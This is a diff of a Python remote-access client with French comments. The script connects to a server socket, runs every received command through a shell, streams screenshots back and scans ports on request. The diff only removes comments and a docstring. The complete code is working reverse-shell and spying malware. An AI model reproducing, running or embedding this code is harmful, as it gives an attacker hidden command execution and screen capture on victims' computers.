@@ -3,11 +3,9 @@ import subprocess
 import pyautogui
 import io
 
-# Adresse IP et port du serveur
-ip_address = '127.0.0.1'  # Adresse IP cible pour le scanner
-port_number = 1234  # Port du serveur
+ip_address = '127.0.0.1'
+port_number = 1234
 
-# Fonction principale pour se connecter au serveur
 def connect_to_server():
     cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     cs.connect((ip_address, port_number))
@@ -25,14 +23,13 @@ def connect_to_server():
                 buffer.seek(0)
 
                 cs.send(str(len(buffer.getvalue())).encode())  # Taille de l'image
-                cs.recv(1024)  # Accuser réception
+                cs.recv(1024)
 
-                cs.sendall(buffer.getvalue())  # Envoyer l'image
+                cs.sendall(buffer.getvalue())
                 continue
             elif command.startswith("scan"):
-                # Analyse des ports sur ip_address
                 parts = command.split()
-                if len(parts) != 3:  # Vérifie que la commande contient start_port et end_port
+                if len(parts) != 3:
                     cs.send("Erreur : commande mal formée. Utilisez : scan <start_port> <end_port>".encode())
                     continue
                 _, start_port, end_port = parts
@@ -41,7 +38,6 @@ def connect_to_server():
                 cs.send(output.encode())
                 continue
 
-            # Exécution des commandes système
             result = subprocess.run(command, shell=True, capture_output=True, text=True)
             output = result.stdout + result.stderr
             if not output:
@@ -49,19 +45,13 @@ def connect_to_server():
             cs.send(output.encode())
         except Exception as e:
             cs.send(f"Error: {e}".encode())
-            print(f"Erreur : {e}")  # Afficher l'erreur pour déboguer
+            print(f"Erreur : {e}")
             break
 
     cs.close()
 
-# Fonction pour scanner les ports sur l'adresse IP définie (ip_address)
 def scan_ports(start_port, end_port):
-    """
-    Scanne une plage de ports sur l'adresse IP définie dans ip_address.
-    :param start_port: Port de départ
-    :param end_port: Port de fin
-    :return: Liste des ports ouverts
-    """
+
     open_ports = []
     for port in range(start_port, end_port + 1):
         try:
@@ -72,9 +62,8 @@ def scan_ports(start_port, end_port):
                 open_ports.append(port)
             sock.close()
         except Exception as e:
-            pass  # Pas d'affichage pour le client
+            pass
     return open_ports
 
 if __name__ == "__main__":
-    # Lancement de la connexion au serveur
     connect_to_server()
